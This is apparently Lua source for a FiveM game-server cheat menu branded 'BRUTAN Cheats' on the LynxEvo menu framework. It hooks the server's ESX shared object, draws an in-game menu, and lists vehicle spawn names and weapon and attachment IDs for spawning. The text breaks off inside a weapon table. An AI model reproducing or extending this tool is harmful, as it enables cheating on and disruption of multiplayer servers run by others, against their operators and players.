local mhaonn = true
ESX = nil;
Citizen.CreateThread(function() while ESX == nil do TriggerEvent("esx:getSharedObject", function(a) ESX = a end) Citizen.Wait(1000) end end) LynxEvo = {}
LynxEvo.debug = false;
local
function c(d) local e = {}
local f = GetGameTimer() / 200;
e.r = math.floor(math.sin(f * d + 0) * 127 + 128) e.g = math.floor(math.sin(f * d + 2) * 127 + 128) e.b = math.floor(math.sin(f * d + 4) * 127 + 128) return e end;
local h = {}
local j = {
    up = 172, down = 173, left = 174, right = 175, select = 176, back = 177
}
local k = 0;
local l = nil;
local m = nil;
local n = 0.23;
local o = 0.11;
local p = 0.03;
local q = 1.0;
local s = 0.041;
local t = 0;
local u = 0.370;
local v = 0.005;
local w = 0.005;
local A = "BRUTAN Cheats"
local
function B(C) if LynxEvo.debug then Citizen.Trace("[LynxEvo] "..tostring(C)) end end;
local
function D(E, F, value) if E and h[E] then h[E][F] = value;
B(E..
    " menu property changed: { "..tostring(F)..
    ", "..tostring(value)..
    " }") end end;
local
function G(E) if E and h[E] then
return h[E].visible
else return false end end;
local
function H(E, I, J) if E and h[E] then D(E, "visible", I) if not J and h[E] then D(E, "currentOption", 1) end;
if I then
if E ~= m and G(m) then H(m, false) end;
m = E end end end;
local
function K(C, x, y, L, M, N, O, P, Q) SetTextColour(M.r, M.g, M.b, M.a) SetTextFont(L) SetTextScale(N, N) if P then SetTextDropShadow(2, 2, 0, 0, 0) end;
if h[m] then
if O then SetTextCentre(O) elseif Q then SetTextWrap(h[m].x, h[m].x + n - v) SetTextRightJustify(true) end end;
SetTextEntry("STRING") AddTextComponentString(C) DrawText(x, y) end;
local
function R(x, y, S, height, M) DrawRect(x, y, S, height, M.r, M.g, M.b, M.a) end;
local
function T() if h[m] then local x = h[m].x + n / 2;
local y = h[m].y + o / 2;
if h[m].titleBackgroundSprite then DrawSprite(h[m].titleBackgroundSprite.dict, h[m].titleBackgroundSprite.name, x, y, n, o, 0., 255, 255, 255, 255)
else R(x, y, n, o, h[m].titleBackgroundColor) end;
K(h[m].title, x, y - o / 2 + p, h[m].titleFont, h[m].titleColor, q, true) end end;
local
function U() if h[m] then local x = h[m].x + n / 2;
local y = h[m].y + o + s / 2;
local V = {
    r = h[m].titleBackgroundColor.r, g = h[m].titleBackgroundColor.g, b = h[m].titleBackgroundColor.b, a = 255
}
R(x, y, n, s, h[m].subTitleBackgroundColor) K(h[m].subTitle, h[m].x + v, y - s / 2 + w, t, V, u, false) if k > h[m].maxOptionCount then K(tostring(h[m].currentOption)..
    " / "..tostring(k), h[m].x + n, y - s / 2 + w, t, V, u, false, false, true) end end end;
local
function W(C, X) local x = h[m].x + n / 2;
local Y = nil;
if h[m].currentOption <= h[m].maxOptionCount and k <= h[m].maxOptionCount then Y = k elseif k > h[m].currentOption - h[m].maxOptionCount and k <= h[m].currentOption then Y = k - (h[m].currentOption - h[m].maxOptionCount) end;
if Y then local y = h[m].y + o + s + s * Y - s / 2;
local Z = nil;
local a0 = nil;
local a1 = nil;
local P = false;
if h[m].currentOption == k then Z = h[m].menuFocusBackgroundColor;
a0 = h[m].menuFocusTextColor;
a1 = h[m].menuFocusTextColor
else Z = h[m].menuBackgroundColor;
a0 = h[m].menuTextColor;
a1 = h[m].menuSubTextColor;
P = true end;
R(x, y, n, s, Z) K(C, h[m].x + v, y - s / 2 + w, t, a0, u, false, P) if X then K(X, h[m].x + v, y - s / 2 + w, t, a1, u, false, P, true) end end end;

function LynxEvo.CreateMenu(E, a2) h[E] = {}
h[E].title = a2;
h[E].subTitle = A;
h[E].visible = false;
h[E].previousMenu = nil;
h[E].aboutToBeClosed = false;
h[E].x = 0.75;
h[E].y = 0.19;
h[E].currentOption = 1;
h[E].maxOptionCount = 10;
h[E].titleFont = 1;
h[E].titleColor = {
    r = 255, g = 255, b = 255, a = 255
}
Citizen.CreateThread(function() while true do Citizen.Wait(0) local a3 = c(1.0) h[E].titleBackgroundColor = {
        r = a3.r, g = a3.g, b = a3.b, a = 105
    }
    h[E].
    menuFocusBackgroundColor = {
        r = 255, g = 255, b = 255, a = 100
    }
    end end) h[E].titleBackgroundSprite = nil;
h[E].menuTextColor = {
    r = 255, g = 255, b = 255, a = 255
}
h[E].menuSubTextColor = {
    r = 189, g = 189, b = 189, a = 255
}
h[E].menuFocusTextColor = {
    r = 255, g = 255, b = 255, a = 255
}
h[E].menuBackgroundColor = {
    r = 0, g = 0, b = 0, a = 100
}
h[E].subTitleBackgroundColor = {
    r = h[E].menuBackgroundColor.r, g = h[E].menuBackgroundColor.g, b = h[E].menuBackgroundColor.b, a = 255
}
h[E].buttonPressedSound = {
    name = "~h~~r~> ~s~SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"
}
B(tostring(E)..
    " menu created") end;

function LynxEvo.CreateSubMenu(E, a4, a5) if h[a4] then LynxEvo.CreateMenu(E, h[a4].title) if a5 then D(E, "subTitle", a5)
else D(E, "subTitle", h[a4].subTitle) end;
D(E, "previousMenu", a4) D(E, "x", h[a4].x) D(E, "y", h[a4].y) D(E, "maxOptionCount", h[a4].maxOptionCount) D(E, "titleFont", h[a4].titleFont) D(E, "titleColor", h[a4].titleColor) D(E, "titleBackgroundColor", h[a4].titleBackgroundColor) D(E, "titleBackgroundSprite", h[a4].titleBackgroundSprite) D(E, "menuTextColor", h[a4].menuTextColor) D(E, "menuSubTextColor", h[a4].menuSubTextColor) D(E, "menuFocusTextColor", h[a4].menuFocusTextColor) D(E, "menuFocusBackgroundColor", h[a4].menuFocusBackgroundColor) D(E, "menuBackgroundColor", h[a4].menuBackgroundColor) D(E, "subTitleBackgroundColor", h[a4].subTitleBackgroundColor)
else B("Failed to create "..tostring(E)..
    " submenu: "..tostring(a4)..
    " parent menu doesn't exist") end end;

function LynxEvo.CurrentMenu() return m end;

function LynxEvo.OpenMenu(E) if E and h[E] then PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) H(E, true) if h[E].titleBackgroundSprite then RequestStreamedTextureDict(h[E].titleBackgroundSprite.dict, false) while not HasStreamedTextureDictLoaded(h[E].titleBackgroundSprite.dict) do Citizen.Wait(0) end end;
    B(tostring(E)..
        " menu opened")
else B("Failed to open "..tostring(E)..
    " menu: it doesn't exist") end end;

function LynxEvo.IsMenuOpened(E) return G(E) end;

function LynxEvo.IsAnyMenuOpened() for E, _ in pairs(h) do
    if G(E) then
return true end end;
return false end;

function LynxEvo.IsMenuAboutToBeClosed() if h[m] then
return h[m].aboutToBeClosed
else return false end end;

function LynxEvo.CloseMenu() if h[m] then
if h[m].aboutToBeClosed then h[m].aboutToBeClosed = false;
H(m, false) B(tostring(m)..
    " menu closed") PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) k = 0;
m = nil;
l = nil
else h[m].aboutToBeClosed = true;
B(tostring(m)..
    " menu about to be closed") end end end;

function LynxEvo.Button(C, X) local a6 = C;
if X then a6 = "{ "..tostring(a6)..
", "..tostring(X)..
" }"
end;
if h[m] then k = k + 1;
local a7 = h[m].currentOption == k;
W(C, X) if a7 then
if l == j.select then PlaySoundFrontend(-1, h[m].buttonPressedSound.name, h[m].buttonPressedSound.set, true) B(a6..
    " button pressed") return true elseif l == j.left or l == j.right then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) end end;
return false
else B("Failed to create "..a6..
    " button: "..tostring(m)..
    " menu doesn't exist") return false end end;

function LynxEvo.MenuButton(C, E) if h[E] then
if LynxEvo.Button(C) then H(m, false) H(E, true, true) return true end
else B("Failed to create "..tostring(C)..
    " menu button: "..tostring(E)..
    " submenu doesn't exist") end;
return false end;

function LynxEvo.CheckBox(C, bool, a8) local a9 = "~r~~h~OFF"
if bool then a9 = "~g~~h~ON"
end;
if LynxEvo.Button(C, a9) then bool = not bool;
B(tostring(C)..
    " checkbox changed to "..tostring(bool)) a8(bool) return true end;
return false end;

function LynxEvo.ComboBox(C, aa, ab, ac, a8) local ad = #aa;
local ae = aa[ab] local a7 = h[m].currentOption == k + 1;
if ad > 1 and a7 then ae = 'Ã¢â€ Â '..tostring(ae)..
' Ã¢â€ â€™'
end;
if LynxEvo.Button(C, ae) then ac = ab;
a8(ab, ac) return true elseif a7 then
if l == j.left then
if ab > 1 then ab = ab - 1
else ab = ad end elseif l == j.right then
if ab < ad then ab = ab + 1
else ab = 1 end end
else ab = ac end;
a8(ab, ac) return false end;

function LynxEvo.Display() if G(m) then
if h[m].aboutToBeClosed then LynxEvo.CloseMenu()
else ClearAllHelpMessages() T() U() l = nil;
if IsDisabledControlJustPressed(0, j.down) then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) if h[m].currentOption < k then h[m].currentOption = h[m].currentOption + 1
else h[m].currentOption = 1 end elseif IsDisabledControlJustPressed(0, j.up) then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) if h[m].currentOption > 1 then h[m].currentOption = h[m].currentOption - 1
else h[m].currentOption = k end elseif IsDisabledControlJustPressed(0, j.left) then l = j.left elseif IsDisabledControlJustPressed(0, j.right) then l = j.right elseif IsDisabledControlJustPressed(0, j.select) then l = j.select elseif IsDisabledControlJustPressed(0, j.back) then
if h[h[m].previousMenu] then PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) H(h[m].previousMenu, true)
else LynxEvo.CloseMenu() end end;
k = 0 end end end;

function LynxEvo.SetMenuWidth(E, S) D(E, "width", S) end;

function LynxEvo.SetMenuX(E, x) D(E, "x", x) end;

function LynxEvo.SetMenuY(E, y) D(E, "y", y) end;

function LynxEvo.SetMenuMaxOptionCountOnScreen(E, count) D(E, "maxOptionCount", count) end;

function LynxEvo.SetTitleColor(E, r, g, b, af) D(E, "titleColor", {
    ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = af or h[E].titleColor.a
}) end;

function LynxEvo.SetTitleBackgroundColor(E, r, g, b, af) D(E, "titleBackgroundColor", {
    ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = af or h[E].titleBackgroundColor.a
}) end;

function LynxEvo.SetTitleBackgroundSprite(E, ag, ah) D(E, "titleBackgroundSprite", {
    dict = ag, name = ah
}) end;

function LynxEvo.SetSubTitle(E, C) D(E, "subTitle", C) end;

function LynxEvo.SetMenuBackgroundColor(E, r, g, b, af) D(E, "menuBackgroundColor", {
    ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = af or h[E].menuBackgroundColor.a
}) end;

function LynxEvo.SetMenuTextColor(E, r, g, b, af) D(E, "menuTextColor", {
    ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = af or h[E].menuTextColor.a
}) end;

function LynxEvo.SetMenuSubTextColor(E, r, g, b, af) D(E, "menuSubTextColor", {
    ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = af or h[E].menuSubTextColor.a
}) end;

function LynxEvo.SetMenuFocusColor(E, r, g, b, af) D(E, "menuFocusColor", {
    ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = af or h[E].menuFocusColor.a
}) end;

function LynxEvo.SetMenuButtonPressedSound(E, name, ai) D(E, "buttonPressedSound", {
    ["name"] = name, ["set"] = ai
}) end;

function KeyboardInput(aj, ak, al) AddTextEntry("FMMC_KEY_TIP1", aj..
    ":") DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ak, "", "", "", al) blockinput = true;
while UpdateOnscreenKeyboard()  ~= 1 and UpdateOnscreenKeyboard()  ~= 2 do Citizen.Wait(0) end;
    if UpdateOnscreenKeyboard()  ~= 2 then local e = GetOnscreenKeyboardResult() Citizen.Wait(500) blockinput = false;
return e
else Citizen.Wait(500) blockinput = false;
return nil end end;
local
function am() local an = {}
for i = 0, GetNumberOfPlayers() do
    if NetworkIsPlayerActive(i) then an[#an + 1] = i end end;
return an end;

function DrawText3D(x, y, z, C, r, g, b) SetDrawOrigin(x, y, z, 0) SetTextFont(0) SetTextProportional(0) SetTextScale(0.0, 0.20) SetTextColour(r, g, b, 255) SetTextDropshadow(0, 0, 0, 0, 255) SetTextEdge(2, 0, 0, 0, 150) SetTextDropShadow() SetTextOutline() SetTextEntry("STRING") SetTextCentre(1) AddTextComponentString(C) DrawText(0.0, 0.0) ClearDrawOrigin() end;

function math.round(ao, ap) return tonumber(string.format("%."..(ap or 0)..
    "f", ao)) end;
local
function c(d) local e = {}
local f = GetGameTimer() / 1000;
e.r = math.floor(math.sin(f * d + 0) * 127 + 128) e.g = math.floor(math.sin(f * d + 2) * 127 + 128) e.b = math.floor(math.sin(f * d + 4) * 127 + 128) return e end;

function drawNotification(C) SetNotificationTextEntry("STRING") AddTextComponentString(C) DrawNotification(false, false) end;

function checkValidVehicleExtras() local aq = PlayerPedId() local ar = GetVehiclePedIsIn(aq, false) local as = {}
for i = 0, 50, 1 do
    if DoesExtraExist(ar, i) then local at = "~h~Extra #"..tostring(i) local C = "OFF"
if IsVehicleExtraTurnedOn(ar, i) then C = "ON"
end;
local au = "~h~extra "..tostring(i) table.insert(as, {
    menuName = realModName, data = {
        ["action"] = realSpawnName, ["state"] = C
    }
}) end end;
return as end;

function DoesVehicleHaveExtras(veh) for i = 1, 30 do
    if DoesExtraExist(veh, i) then
return true end end;
return false end;

function checkValidVehicleMods(av) local aq = PlayerPedId() local ar = GetVehiclePedIsIn(aq, false) local as = {}
local aw = GetNumVehicleMods(ar, av) if av == 48 and aw == 0 then local aw = GetVehicleLiveryCount(ar) for i = 1, aw, 1 do local ax = i - 1;
    local ay = GetLiveryName(ar, ax) local realModName = GetLabelText(ay) local az, realSpawnName = av, ax;
as[i] = {
    menuName = realModName, data = {
        ["modid"] = az, ["realIndex"] = realSpawnName
    }
}
end end;
for i = 1, aw, 1 do local ax = i - 1;
    local ay = GetModTextLabel(ar, av, ax) local realModName = GetLabelText(ay) local az, realSpawnName = aw, ax;
as[i] = {
    menuName = realModName, data = {
        ["modid"] = az, ["realIndex"] = realSpawnName
    }
}
end;
if aw > 0 then local ax = -1;
local az, realSpawnName = av, ax;
table.insert(as, 1, {
    menuName = "Stock", data = {
        ["modid"] = az, ["realIndex"] = realSpawnName
    }
}) end;
return as end;
local aA = {
    "Dinghy", "Dinghy2", "Dinghy3", "Dingh4", "Jetmax", "Marquis", "Seashark", "Seashark2", "Seashark3", "Speeder", "Speeder2", "Squalo", "Submersible", "Submersible2", "Suntrap", "Toro", "Toro2", "Tropic", "Tropic2", "Tug"
}
local aB = {
    "Benson", "Biff", "Cerberus", "Cerberus2", "Cerberus3", "Hauler", "Hauler2", "Mule", "Mule2", "Mule3", "Mule4", "Packer", "Phantom", "Phantom2", "Phantom3", "Pounder", "Pounder2", "Stockade", "Stockade3", "Terbyte"
}
local aC = {
    "Blista", "Blista2", "Blista3", "Brioso", "Dilettante", "Dilettante2", "Issi2", "Issi3", "issi4", "Iss5", "issi6", "Panto", "Prarire", "Rhapsody"
}
local aD = {
    "CogCabrio", "Exemplar", "F620", "Felon", "Felon2", "Jackal", "Oracle", "Oracle2", "Sentinel", "Sentinel2", "Windsor", "Windsor2", "Zion", "Zion2"
}
local aE = {
    "Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3"
}
local aF = {
    "ambulance", "FBI", "FBI2", "FireTruk", "PBus", "police", "Police2", "Police3", "Police4", "PoliceOld1", "PoliceOld2", "PoliceT", "Policeb", "Polmav", "Pranger", "Predator", "Riot", "Riot2", "Sheriff", "Sheriff2"
}
local aG = {
    "Akula", "Annihilator", "Buzzard", "Buzzard2", "Cargobob", "Cargobob2", "Cargobob3", "Cargobob4", "Frogger", "Frogger2", "Havok", "Hunter", "Maverick", "Savage", "Seasparrow", "Skylift", "Supervolito", "Supervolito2", "Swift", "Swift2", "Valkyrie", "Valkyrie2", "Volatus"
}
local aH = {
    "Bulldozer", "Cutter", "Dump", "Flatbed", "Guardian", "Handler", "Mixer", "Mixer2", "Rubble", "Tiptruck", "Tiptruck2"
}
local aI = {
    "APC", "Barracks", "Barracks2", "Barracks3", "Barrage", "Chernobog", "Crusader", "Halftrack", "Khanjali", "Rhino", "Scarab", "Scarab2", "Scarab3", "Thruster", "Trailersmall2"
}
local aJ = {
    "Akuma", "Avarus", "Bagger", "Bati2", "Bati", "BF400", "Blazer4", "CarbonRS", "Chimera", "Cliffhanger", "Daemon", "Daemon2", "Defiler", "Deathbike", "Deathbike2", "Deathbike3", "Diablous", "Diablous2", "Double", "Enduro", "esskey", "Faggio2", "Faggio3", "Faggio", "Fcr2", "fcr", "gargoyle", "hakuchou2", "hakuchou", "hexer", "innovation", "Lectro", "Manchez", "Nemesis", "Nightblade", "Oppressor", "Oppressor2", "PCJ", "Ratbike", "Ruffian", "Sanchez2", "Sanchez", "Sanctus", "Shotaro", "Sovereign", "Thrust", "Vader", "Vindicator", "Vortex", "Wolfsbane", "zombiea", "zombieb"
}
local aK = {
    "Blade", "Buccaneer", "Buccaneer2", "Chino", "Chino2", "clique", "Deviant", "Dominator", "Dominator2", "Dominator3", "Dominator4", "Dominator5", "Dominator6", "Dukes", "Dukes2", "Ellie", "Faction", "faction2", "faction3", "Gauntlet", "Gauntlet2", "Hermes", "Hotknife", "Hustler", "Impaler", "Impaler2", "Impaler3", "Impaler4", "Imperator", "Imperator2", "Imperator3", "Lurcher", "Moonbeam", "Moonbeam2", "Nightshade", "Phoenix", "Picador", "RatLoader", "RatLoader2", "Ruiner", "Ruiner2", "Ruiner3", "SabreGT", "SabreGT2", "Sadler2", "Slamvan", "Slamvan2", "Slamvan3", "Slamvan4", "Slamvan5", "Slamvan6", "Stalion", "Stalion2", "Tampa", "Tampa3", "Tulip", "Vamos,", "Vigero", "Virgo", "Virgo2", "Virgo3", "Voodoo", "Voodoo2", "Yosemite"
}
local aL = {
    "BFinjection", "Bifta", "Blazer", "Blazer2", "Blazer3", "Blazer5", "Bohdi", "Brawler", "Bruiser", "Bruiser2", "Bruiser3", "Caracara", "DLoader", "Dune", "Dune2", "Dune3", "Dune4", "Dune5", "Insurgent", "Insurgent2", "Insurgent3", "Kalahari", "Kamacho", "LGuard", "Marshall", "Mesa", "Mesa2", "Mesa3", "Monster", "Monster4", "Monster5", "Nightshark", "RancherXL", "RancherXL2", "Rebel", "Rebel2", "RCBandito", "Riata", "Sandking", "Sandking2", "Technical", "Technical2", "Technical3", "TrophyTruck", "TrophyTruck2", "Freecrawler", "Menacer"
}
local aM = {
    "AlphaZ1", "Avenger", "Avenger2", "Besra", "Blimp", "blimp2", "Blimp3", "Bombushka", "Cargoplane", "Cuban800", "Dodo", "Duster", "Howard", "Hydra", "Jet", "Lazer", "Luxor", "Luxor2", "Mammatus", "Microlight", "Miljet", "Mogul", "Molotok", "Nimbus", "Nokota", "Pyro", "Rogue", "Seabreeze", "Shamal", "Starling", "Stunt", "Titan", "Tula", "Velum", "Velum2", "Vestra", "Volatol", "Striekforce"
}
local aN = {
    "BJXL", "Baller", "Baller2", "Baller3", "Baller4", "Baller5", "Baller6", "Cavalcade", "Cavalcade2", "Dubsta", "Dubsta2", "Dubsta3", "FQ2", "Granger", "Gresley", "Habanero", "Huntley", "Landstalker", "patriot", "Patriot2", "Radi", "Rocoto", "Seminole", "Serrano", "Toros", "XLS", "XLS2"
}
local aO = {
    "Asea", "Asea2", "Asterope", "Cog55", "Cogg552", "Cognoscenti", "Cognoscenti2", "emperor", "emperor2", "emperor3", "Fugitive", "Glendale", "ingot", "intruder", "limo2", "premier", "primo", "primo2", "regina", "romero", "stafford", "Stanier", "stratum", "stretch", "surge", "tailgater", "warrener", "Washington"
}
local aP = {
    "Airbus", "Brickade", "Bus", "Coach", "Rallytruck", "Rentalbus", "taxi", "Tourbus", "Trash", "Trash2", "WastIndr", "PBus2"
}
local aQ = {
    "Alpha", "Banshee", "Banshee2", "BestiaGTS", "Buffalo", "Buffalo2", "Buffalo3", "Carbonizzare", "Comet2", "Comet3", "Comet4", "Comet5", "Coquette", "Deveste", "Elegy", "Elegy2", "Feltzer2", "Feltzer3", "FlashGT", "Furoregt", "Fusilade", "Futo", "GB200", "Hotring", "Infernus2", "Italigto", "Jester", "Jester2", "Khamelion", "Kurama", "Kurama2", "Lynx", "MAssacro", "MAssacro2", "neon", "Ninef", "ninfe2", "omnis", "Pariah", "Penumbra", "Raiden", "RapidGT", "RapidGT2", "Raptor", "Revolter", "Ruston", "Schafter2", "Schafter3", "Schafter4", "Schafter5", "Schafter6", "Schlagen", "Schwarzer", "Sentinel3", "Seven70", "Specter", "Specter2", "Streiter", "Sultan", "Surano", "Tampa2", "Tropos", "Verlierer2", "ZR380", "ZR3802", "ZR3803"
}
local aR = {
    "Ardent", "BType", "BType2", "BType3", "Casco", "Cheetah2", "Cheburek", "Coquette2", "Coquette3", "Deluxo", "Fagaloa", "Gt500", "JB700", "JEster3", "MAmba", "Manana", "Michelli", "Monroe", "Peyote", "Pigalle", "RapidGT3", "Retinue", "Savastra", "Stinger", "Stingergt", "Stromberg", "Swinger", "Torero", "Tornado", "Tornado2", "Tornado3", "Tornado4", "Tornado5", "Tornado6", "Viseris", "Z190", "ZType"
}
local aS = {
    "Adder", "Autarch", "Bullet", "Cheetah", "Cyclone", "EntityXF", "Entity2", "FMJ", "GP1", "Infernus", "LE7B", "Nero", "Nero2", "Osiris", "Penetrator", "PFister811", "Prototipo", "Reaper", "SC1", "Scramjet", "Sheava", "SultanRS", "Superd", "T20", "Taipan", "Tempesta", "Tezeract", "Turismo2", "Turismor", "Tyrant", "Tyrus", "Vacca", "Vagner", "Vigilante", "Visione", "Voltic", "Voltic2", "Zentorno", "Italigtb", "Italigtb2", "XA21"
}
local aT = {
    "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"
}
local aU = {
    "Freight", "Freightcar", "Freightcont1", "Freightcont2", "Freightgrain", "Freighttrailer", "TankerCar"
}
local aV = {
    "Airtug", "Caddy", "Caddy2", "Caddy3", "Docktug", "Forklift", "Mower", "Ripley", "Sadler", "Scrap", "TowTruck", "Towtruck2", "Tractor", "Tractor2", "Tractor3", "TrailerLArge2", "Utilitruck", "Utilitruck3", "Utilitruck2"
}
local aW = {
    "Bison", "Bison2", "Bison3", "BobcatXL", "Boxville", "Boxville2", "Boxville3", "Boxville4", "Boxville5", "Burrito", "Burrito2", "Burrito3", "Burrito4", "Burrito5", "Camper", "GBurrito", "GBurrito2", "Journey", "Minivan", "Minivan2", "Paradise", "pony", "Pony2", "Rumpo", "Rumpo2", "Rumpo3", "Speedo", "Speedo2", "Speedo4", "Surfer", "Surfer2", "Taco", "Youga", "youga2"
}
local aX = {
    "Boats", "Commercial", "Compacts", "Coupes", "Cycles", "Emergency", "Helictopers", "Industrial", "Military", "Motorcycles", "Muscle", "Off-Road", "Planes", "SUVs", "Sedans", "Service", "Sports", "Sports Classic", "Super", "Trailer", "Trains", "Utility", "Vans"
}
local aY = {
    aA, aB, aC, aD, aE, aF, aG, aH, aI, aJ, aK, aL, aM, aN, aO, aP, aQ, aR, aS, aT, aU, aV, aW
}
local aZ = {
    "WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_MACHINEPISTOL", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_PUMPSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_STINGER", "WEAPON_FIREWORK", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_BZGAS", "WEAPON_SMOKEGRENADE", "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL", "WEAPON_FLARE", "WEAPON_BALL"
}
local a_ = {
    Melee = {
        BaseballBat = {
            id = "weapon_bat", name = "~h~~r~> ~s~Baseball Bat", bInfAmmo = false, mods = {}
        }, BrokenBottle = {
            id = "weapon_bottle", name = "~h~~r~> ~s~Broken Bottle", bInfAmmo = false, mods = {}
        }, Crowbar = {
            id = "weapon_Crowbar", name = "~h~~r~> ~s~Crowbar", bInfAmmo = false, mods = {}
        }, Flashlight = {
            id = "weapon_flashlight", name = "~h~~r~> ~s~Flashlight", bInfAmmo = false, mods = {}
        }, GolfClub = {
            id = "weapon_golfclub", name = "~h~~r~> ~s~Golf Club", bInfAmmo = false, mods = {}
        }, BrassKnuckles = {
            id = "weapon_knuckle", name = "~h~~r~> ~s~Brass Knuckles", bInfAmmo = false, mods = {}
        }, Knife = {
            id = "weapon_knife", name = "~h~~r~> ~s~Knife", bInfAmmo = false, mods = {}
        }, Machete = {
            id = "weapon_machete", name = "~h~~r~> ~s~Machete", bInfAmmo = false, mods = {}
        }, Switchblade = {
            id = "weapon_switchblade", name = "~h~~r~> ~s~Switchblade", bInfAmmo = false, mods = {}
        }, Nightstick = {
            id = "weapon_nightstick", name = "~h~~r~> ~s~Nightstick", bInfAmmo = false, mods = {}
        }, BattleAxe = {
            id = "weapon_battleaxe", name = "~h~~r~> ~s~Battle Axe", bInfAmmo = false, mods = {}
        }
    }, Handguns = {
        Pistol = {
            id = "weapon_pistol", name = "~h~~r~> ~s~Pistol", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_PISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_PISTOL_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"
                    }
                }
            }
        }, PistolMK2 = {
            id = "weapon_pistol_mk2", name = "~h~~r~> ~s~Pistol MK 2", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Mounted Scope", id = "COMPONENT_AT_PI_RAIL"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Compensator", id = "COMPONENT_AT_PI_COMP"
                    }, {
                        name = "~h~~r~> ~s~Suppessor", id = "COMPONENT_AT_PI_SUPP_02"
                    }
                }
            }
        }, CombatPistol = {
            id = "weapon_combatpistol", name = "~h~Combat Pistol", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_02"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
                    }
                }
            }
        }, APPistol = {
